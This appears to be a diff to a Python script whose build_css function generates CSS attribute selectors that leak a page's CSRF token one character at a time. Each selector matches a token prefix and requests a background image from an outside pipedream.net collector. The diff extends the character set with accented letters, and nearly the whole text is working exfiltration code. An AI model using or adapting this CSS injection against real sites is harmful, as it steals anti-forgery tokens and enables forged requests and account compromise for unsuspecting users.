@@ -106,7 +106,13 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+ bytearray.fromhex("5C").decode() + bytearray.fromhex("22").decode() + '''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%22);}
         input[name="csrf"][value^="'''+chars+''''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%27);}
         input[name="csrf"][value^="'''+chars+'''`"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%60);}
-        input[name="csrf"][value^="'''+chars+ bytearray.fromhex("5C").decode() + bytearray.fromhex("5C").decode()+'''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5C);}'''
+        input[name="csrf"][value^="'''+chars+ bytearray.fromhex("5C").decode() + bytearray.fromhex("5C").decode()+'''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%5C);}
+        input[name="csrf"][value^="'''+chars+'''é"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''é);}
+        input[name="csrf"][value^="'''+chars+'''à"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''à);}
+        input[name="csrf"][value^="'''+chars+'''è"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''è);}
+        input[name="csrf"][value^="'''+chars+'''°"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''°);}
+        input[name="csrf"][value^="'''+chars+'''ç"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''ç);}
+        input[name="csrf"][value^="'''+chars+'''ù"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''ù);}'''
         
         file.write(str+"\n\t"+str2) 
         file.close()
